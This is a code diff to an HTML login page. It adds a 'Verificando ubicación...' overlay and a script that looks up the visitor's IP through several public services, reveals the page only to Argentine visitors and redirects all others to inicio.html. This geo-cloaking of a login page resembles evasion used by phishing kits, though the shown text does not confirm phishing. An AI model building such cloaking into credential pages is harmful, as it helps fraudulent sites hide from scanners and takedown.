@@ -320,12 +320,48 @@
             100% { transform: rotate(360deg); }
         }
 
+        /* =========================
+           MENSAJE DE VERIFICACIÓN
+        ========================== */
+        #verificando {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            font-size: 20px;
+            color: #1768ff;
+            flex-direction: column;
+        }
+        #verificando .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #e4e7ed;
+            border-top: 4px solid #1768ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
     </style>
 
 </head>
 
 
 <body>
+
+    <!-- =========================
+         PANTALLA DE VERIFICACIÓN
+    ========================== -->
+    <div id="verificando">
+        <div class="spinner"></div>
+        <p>Verificando ubicación...</p>
+    </div>
 
     <!-- =========================
          LOADING OVERLAY
@@ -336,7 +372,7 @@
     </div>
 
 
-    <div class="page">
+    <div class="page" id="contenidoPrincipal" style="display:none;">
 
         <!-- =========================
              ÁREA DE LOGIN
@@ -450,46 +486,92 @@
         //  Si es Argentina → se queda en la página
         // ============================================================
 
-        (function() {
-            // Función para obtener la IP del usuario
-            function getUserIP() {
-                return fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => data.ip)
-                    .catch(() => null);
-            }
-
-            // Función para obtener el país a partir de la IP
-            function getCountryFromIP(ip) {
-                return fetch(`https://ip-api.com/json/${ip}?fields=countryCode`)
-                    .then(response => response.json())
-                    .then(data => data.countryCode)
-                    .catch(() => null);
-            }
-
-            // Ejecutar la verificación al cargar la página
-            getUserIP()
-                .then(ip => {
-                    if (!ip) {
-                        // Si no se pudo obtener IP, redirigimos por seguridad
-                        window.location.href = 'inicio.html';
-                        return;
-                    }
-                    return getCountryFromIP(ip).then(countryCode => {
-                        // Si el país NO es Argentina (código 'AR'), redirigir a inicio.html
-                        if (countryCode !== 'AR') {
-                            window.location.href = 'inicio.html';
-                        }
-                        // Si es Argentina, no hacemos nada (se queda en la página)
-                        console.log('✅ IP Argentina. Acceso permitido.');
-                    });
+        // Función para obtener la IP del usuario usando múltiples métodos
+        function getUserIP() {
+            // Intentar con ipify primero
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => {
+                    if (!response.ok) throw new Error('Error en ipify');
+                    return response.json();
                 })
+                .then(data => data.ip)
                 .catch(() => {
-                    // En caso de error, redirigimos por seguridad
-                    window.location.href = 'inicio.html';
+                    // Si falla ipify, intentar con ip-api
+                    return fetch('https://ip-api.com/json/?fields=query')
+                        .then(response => {
+                            if (!response.ok) throw new Error('Error en ip-api');
+                            return response.json();
+                        })
+                        .then(data => data.query)
+                        .catch(() => {
+                            // Si todo falla, usar un método alternativo
+                            return fetch('https://api.ip.sb/ip')
+                                .then(response => response.text())
+                                .then(ip => ip.trim())
+                                .catch(() => null);
+                        });
                 });
+        }
 
-        })();
+        // Función para obtener el país a partir de la IP
+        function getCountryFromIP(ip) {
+            // Intentar con ip-api.com (más rápido y confiable)
+            return fetch(`https://ip-api.com/json/${ip}?fields=countryCode`)
+                .then(response => {
+                    if (!response.ok) throw new Error('Error en ip-api');
+                    return response.json();
+                })
+                .then(data => data.countryCode)
+                .catch(() => {
+                    // Si falla, intentar con ipinfo.io como respaldo
+                    return fetch(`https://ipinfo.io/${ip}/json`)
+                        .then(response => {
+                            if (!response.ok) throw new Error('Error en ipinfo');
+                            return response.json();
+                        })
+                        .then(data => data.country)
+                        .catch(() => null);
+                });
+        }
+
+        // Ejecutar la verificación al cargar la página
+        async function verificarPais() {
+            try {
+                // 1. Obtener la IP
+                const ip = await getUserIP();
+                console.log('IP obtenida:', ip);
+                
+                if (!ip) {
+                    console.warn('No se pudo obtener la IP. Redirigiendo por seguridad.');
+                    window.location.href = 'inicio.html';
+                    return;
+                }
+
+                // 2. Obtener el país
+                const countryCode = await getCountryFromIP(ip);
+                console.log('Código de país:', countryCode);
+
+                // 3. Decidir qué hacer
+                if (countryCode === 'AR') {
+                    // Es Argentina → mostrar la página
+                    console.log('✅ IP Argentina. Acceso permitido.');
+                    document.getElementById('verificando').style.display = 'none';
+                    document.getElementById('contenidoPrincipal').style.display = 'flex';
+                } else {
+                    // No es Argentina → redirigir
+                    console.log('❌ IP no Argentina. Redirigiendo a inicio.html');
+                    window.location.href = 'inicio.html';
+                }
+
+            } catch (error) {
+                console.error('Error en verificación:', error);
+                // En caso de error, redirigir por seguridad
+                window.location.href = 'inicio.html';
+            }
+        }
+
+        // Iniciar la verificación
+        verificarPais();
 
 
         // ============================================================
